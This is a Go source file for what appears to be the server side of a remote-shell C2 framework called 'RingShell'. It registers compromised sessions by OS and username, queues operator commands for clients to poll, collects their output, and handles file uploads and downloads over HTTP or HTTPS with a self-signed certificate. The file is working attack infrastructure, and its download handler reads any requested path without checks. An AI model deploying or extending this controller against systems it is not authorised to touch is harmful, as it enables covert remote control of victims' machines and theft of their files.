package Server

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/base64"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"io"
	"log"
	"math/big"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"
)

var (
	address                    string        = ""
	port                       int           = 8642
	dt                                       = make(map[string][]string)
	chs                                      = make(map[string]chan string)
	respChs                                  = make(map[string]chan string)
	mu                         sync.RWMutex
	CId                        string        = ""
	outputDir                  string
	timeout                    time.Duration = 5 * time.Second
	defaultPortNumber          string        = "65000"
	controllingServersChannels               = make(map[string]chan string)
	listeningServersChannels                 = make(map[string]chan string)
	controllingServers                       = make(map[string]string)
	listeningServers                         = make(map[string]string)
	sessionCounter             int           = 0
	sessionCounterMu           sync.Mutex
	useHTTPS                   bool          = false
	certFile                   string        = ""
	keyFile                    string        = ""
)

type CommandResponse struct {
	Output string `json:"output"`
	Error  string `json:"error,omitempty"`
}

type SessionInfo struct {
	OS       string `json:"os"`
	Username string `json:"username"`
}

func generateSelfSignedCert() (tls.Certificate, error) {
	priv, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return tls.Certificate{}, err
	}

	template := x509.Certificate{
		SerialNumber: big.NewInt(1),
		Subject: pkix.Name{
			Organization: []string{"RingShell"},
		},
		NotBefore:             time.Now(),
		NotAfter:              time.Now().Add(365 * 24 * time.Hour),
		KeyUsage:              x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature,
		ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
		BasicConstraintsValid: true,
	}

	certDER, err := x509.CreateCertificate(rand.Reader, &template, &template, &priv.PublicKey, priv)
	if err != nil {
		return tls.Certificate{}, err
	}

	certPEM := pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: certDER})
	keyPEM := pem.EncodeToMemory(&pem.Block{Type: "RSA PRIVATE KEY", Bytes: x509.MarshalPKCS1PrivateKey(priv)})

	return tls.X509KeyPair(certPEM, keyPEM)
}

func Server(serverPort int, https bool, cert string, key string) {
	port = serverPort
	useHTTPS = https
	certFile = cert
	keyFile = key

	if dir, err := os.Getwd(); err != nil {
		log.Println("Unable to get the Current Working Directory:", err)
	} else {
		outputDir = dir
	}

	mux := http.NewServeMux()
	mux.HandleFunc("/connect", handleConnect)
	mux.HandleFunc("/poll", handlePoll)
	mux.HandleFunc("/response", handleResponse)
	mux.HandleFunc("/upload", handleUpload)
	mux.HandleFunc("/download", handleDownload)

	server := &http.Server{
		Addr:         fmt.Sprintf("%s:%d", address, port),
		Handler:      mux,
		ReadTimeout:  30 * time.Second,
		WriteTimeout: 30 * time.Second,
	}

	go func() {
		var err error
		if useHTTPS {
			if certFile != "" && keyFile != "" {
				err = server.ListenAndServeTLS(certFile, keyFile)
			} else {
				tlsCert, certErr := generateSelfSignedCert()
				if certErr != nil {
					log.Fatalln("Unable to generate self-signed certificate:", certErr)
				}
				server.TLSConfig = &tls.Config{
					Certificates: []tls.Certificate{tlsCert},
				}
				err = server.ListenAndServeTLS("", "")
			}
		} else {
			err = server.ListenAndServe()
		}
		if err != nil && err != http.ErrServerClosed {
			log.Fatalln("Unable to start server:", err)
		}
	}()

	inputParser()
}

func handleConnect(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	var info SessionInfo
	if err := json.NewDecoder(r.Body).Decode(&info); err != nil {
		http.Error(w, "Invalid request", http.StatusBadRequest)
		return
	}

	sessionCounterMu.Lock()
	sessionID := fmt.Sprint(sessionCounter)
	sessionCounter++
	sessionCounterMu.Unlock()

	mu.Lock()
	dt[sessionID] = []string{r.RemoteAddr, info.OS, info.Username}
	chs[sessionID] = make(chan string, 10)
	respChs[sessionID] = make(chan string, 10)
	mu.Unlock()

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]string{"session_id": sessionID})
}

func handlePoll(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	sessionID := r.URL.Query().Get("session_id")
	if sessionID == "" {
		http.Error(w, "Missing session_id", http.StatusBadRequest)
		return
	}

	mu.RLock()
	ch, exists := chs[sessionID]
	mu.RUnlock()

	if !exists {
		http.Error(w, "Session not found", http.StatusNotFound)
		return
	}

	select {
	case cmd := <-ch:
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(map[string]string{"command": cmd})
	case <-time.After(30 * time.Second):
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(map[string]string{"command": ""})
	}
}

func handleResponse(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	var resp CommandResponse
	if err := json.NewDecoder(r.Body).Decode(&resp); err != nil {
		http.Error(w, "Invalid request", http.StatusBadRequest)
		return
	}

	sessionID := r.URL.Query().Get("session_id")
	if sessionID == "" {
		http.Error(w, "Missing session_id", http.StatusBadRequest)
		return
	}

	mu.RLock()
	ch, exists := respChs[sessionID]
	mu.RUnlock()

	if !exists {
		http.Error(w, "Session not found", http.StatusNotFound)
		return
	}

	if resp.Error != "" {
		ch <- fmt.Sprintf("Error: %s", resp.Error)
	} else {
		ch <- resp.Output
	}

	w.WriteHeader(http.StatusOK)
}

func handleUpload(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	sessionID := r.URL.Query().Get("session_id")
	fileName := r.URL.Query().Get("filename")

	if sessionID == "" || fileName == "" {
		http.Error(w, "Missing parameters", http.StatusBadRequest)
		return
	}

	mu.RLock()
	_, exists := chs[sessionID]
	mu.RUnlock()

	if !exists {
		http.Error(w, "Session not found", http.StatusNotFound)
		return
	}

	if strings.Contains(fileName, "..") || strings.Contains(fileName, "/") || strings.Contains(fileName, "\\") {
		http.Error(w, "Invalid filename", http.StatusBadRequest)
		return
	}

	filePath := filepath.Join(outputDir, fileName)
	file, err := os.Create(filePath)
	if err != nil {
		http.Error(w, "Unable to create file", http.StatusInternalServerError)
		return
	}
	defer file.Close()

	_, err = io.Copy(file, r.Body)
	if err != nil {
		http.Error(w, "Unable to save file", http.StatusInternalServerError)
		return
	}

	w.WriteHeader(http.StatusOK)
}

func handleDownload(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	sessionID := r.URL.Query().Get("session_id")
	fileName := r.URL.Query().Get("filename")

	if sessionID == "" || fileName == "" {
		http.Error(w, "Missing parameters", http.StatusBadRequest)
		return
	}

	mu.RLock()
	_, exists := chs[sessionID]
	mu.RUnlock()

	if !exists {
		http.Error(w, "Session not found", http.StatusNotFound)
		return
	}

	file, err := os.Open(fileName)
	if err != nil {
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(map[string]string{"error": "file not found"})
		return
	}
	defer file.Close()

	stat, err := file.Stat()
	if err != nil {
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(map[string]string{"error": "unable to read file info"})
		return
	}

	content, err := io.ReadAll(file)
	if err != nil {
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(map[string]string{"error": "unable to read file"})
		return
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"filename": fileName,
		"content":  base64Encode(content),
		"size":     stat.Size(),
	})
}

func base64Encode(data []byte) string {
	return base64.StdEncoding.EncodeToString(data)
}
